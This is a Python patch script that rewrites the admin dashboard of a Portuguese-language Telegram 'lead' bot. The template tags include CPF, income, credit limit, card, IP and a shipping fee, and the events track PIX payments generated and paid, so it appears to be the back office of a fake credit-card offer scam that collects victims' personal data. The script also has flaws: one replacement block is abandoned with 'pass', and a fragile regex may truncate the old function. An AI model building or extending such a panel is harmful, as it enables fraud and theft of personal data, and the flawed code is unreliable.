import os

html_path = 'templates/admin_dashboard.html'
with open(html_path, 'r', encoding='utf-8') as f:
    html = f.read()

# Replace the old bot config section
old_sec_bot_start = html.find('<div class="content-section" id="sec-bot">')
if old_sec_bot_start != -1:
    old_sec_bot_end = html.find('</div>\n        </div>', old_sec_bot_start) + len('</div>\n        </div>')
    
    new_tg_ui = """<div class="content-section" id="sec-bot">
          <div class="section-header">
            <h2>Integração Telegram & Notificações Avançadas</h2>
            <p>Configure para onde o bot deve enviar leads e gerencie templates de notificação.</p>
          </div>
          <div class="config-card">
            <h3 style="margin-bottom: 12px; display:flex; align-items:center; gap:8px;">
              <svg fill="#0088cc" width="20" height="20" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a5.8 5.8 0 0 0-1.056.094zM7.2 16.8l1.2-4.8L4.8 9.6l5.4-.6 1.8-5.4 2.4 4.8 5.4.6-3.6 3.6 1.2 4.8-4.8-1.8-4.8 2.4z"/></svg> 
              Credenciais e Roteamento
            </h3>
            <div class="field-group">
              <label class="field-label">Token do Bot (BotFather)</label>
              <input type="text" class="field-input" id="cfg-bot-token" placeholder="Ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px;">
              <div class="field-group">
                <label class="field-label">ID do Canal / Grupo</label>
                <input type="text" class="field-input" id="cfg-bot-channel" placeholder="Ex: -100123456789">
              </div>
              <div class="field-group">
                <label class="field-label">ID do Tópico (Opcional)</label>
                <input type="text" class="field-input" id="cfg-bot-topic" placeholder="Ex: 2 (Apenas para grupos com tópicos)">
              </div>
            </div>
            
            <hr style="border:none; border-top:1px solid var(--border); margin:24px 0;">
            <h3 style="margin-bottom: 12px;">Modelos de Mensagem (Templates Markdown)</h3>
            <p style="font-size:0.8rem; color:var(--text-dim); margin-bottom:16px;">
              Tags disponíveis: <code>{nome}</code>, <code>{cpf}</code>, <code>{whatsapp}</code>, <code>{ip}</code>, <code>{limite}</code>, <code>{renda}</code>, <code>{cartao}</code>, <code>{status}</code>, <code>{frete}</code>, <code>{icon}</code>, <code>{event}</code><br>
              Deixe em branco para usar o modelo padrão de planilha organizada.
            </p>
            
            <div class="field-group">
              <label class="field-label">Mensagem: Lead Iniciou (ENTRY)</label>
              <textarea class="field-input" id="cfg-tpl-entry" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: Cartão Escolhido (CARD_CHOSEN)</label>
              <textarea class="field-input" id="cfg-tpl-card" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: PIX Gerado (PIX_GENERATED)</label>
              <textarea class="field-input" id="cfg-tpl-pix-gen" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>
            <div class="field-group">
              <label class="field-label">Mensagem: PIX Pago (PIX_PAID)</label>
              <textarea class="field-input" id="cfg-tpl-pix-paid" rows="3" placeholder="Deixe em branco para modelo padrão..."></textarea>
            </div>

            <button class="btn-primary" onclick="saveBotConfig()" style="margin-top: 12px; width:auto; padding:0 32px;">Salvar Telegram</button>
          </div>
        </div>"""
    
    html = html[:old_sec_bot_start] + new_tg_ui + html[old_sec_bot_end:]

# Replace JS loadConfig
load_js_start = html.find('async function loadConfig() {')
if load_js_start != -1:
    load_js_end = html.find('}', html.find('if(data.tg_log_thread_id)', load_js_start)) + 1
    new_load_js = """async function loadConfig() {
      // Load Bot config
      const res = await fetch('/api/admin/bot-config', { headers: { 'Authorization': 'Bearer ' + localStorage.getItem('admin_token') } });
      if (res.ok) {
        const data = await res.json();
        if(data.telegram_token) document.getElementById('cfg-bot-token').value = data.telegram_token;
        if(data.tg_log_channel) document.getElementById('cfg-bot-channel').value = data.tg_log_channel;
        if(data.tg_log_thread_id) document.getElementById('cfg-bot-topic').value = data.tg_log_thread_id;
        if(data.tg_tpl_entry) document.getElementById('cfg-tpl-entry').value = data.tg_tpl_entry;
        if(data.tg_tpl_card_chosen) document.getElementById('cfg-tpl-card').value = data.tg_tpl_card_chosen;
        if(data.tg_tpl_pix_generated) document.getElementById('cfg-tpl-pix-gen').value = data.tg_tpl_pix_generated;
        if(data.tg_tpl_pix_paid) document.getElementById('cfg-tpl-pix-paid').value = data.tg_tpl_pix_paid;
      }"""
    html = html[:load_js_start] + new_load_js + html[load_js_end:]

# Replace JS saveBotConfig
save_js_start = html.find('async function saveBotConfig() {')
if save_js_start != -1:
    save_js_end = html.find('}', html.find('tg.showAlert', save_js_start)) + 1
    new_save_js = """async function saveBotConfig() {
      const payload = {
        token: document.getElementById('cfg-bot-token').value,
        channel: document.getElementById('cfg-bot-channel').value,
        topic: document.getElementById('cfg-bot-topic').value,
        tpl_entry: document.getElementById('cfg-tpl-entry').value,
        tpl_card_chosen: document.getElementById('cfg-tpl-card').value,
        tpl_pix_generated: document.getElementById('cfg-tpl-pix-gen').value,
        tpl_pix_paid: document.getElementById('cfg-tpl-pix-paid').value
      };
      const res = await fetch('/api/admin/bot-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
        },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        tg.showAlert("Configurações do Telegram salvas com sucesso!");
      } else {
        tg.showAlert("Erro ao salvar configurações do Telegram.");
      }
    }"""
    # actually need to find the matching closing brace for saveBotConfig.
    # A simple regex or string split might be safer for replacing exactly up to the end of the function.
    pass

import re
html = re.sub(
    r'async function saveBotConfig\(\)\s*\{.*?\n\s*\}',
    """async function saveBotConfig() {
      const payload = {
        token: document.getElementById('cfg-bot-token').value,
        channel: document.getElementById('cfg-bot-channel').value,
        topic: document.getElementById('cfg-bot-topic').value,
        tpl_entry: document.getElementById('cfg-tpl-entry').value,
        tpl_card_chosen: document.getElementById('cfg-tpl-card').value,
        tpl_pix_generated: document.getElementById('cfg-tpl-pix-gen').value,
        tpl_pix_paid: document.getElementById('cfg-tpl-pix-paid').value
      };
      const res = await fetch('/api/admin/bot-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
        },
        body: JSON.stringify(payload)
      });
      if (res.ok) {
        tg.showAlert("Configurações do Telegram salvas com sucesso!");
      } else {
        tg.showAlert("Erro ao salvar configurações do Telegram.");
      }
    }""",
    html,
    flags=re.DOTALL
)

with open(html_path, 'w', encoding='utf-8') as f:
    f.write(html)
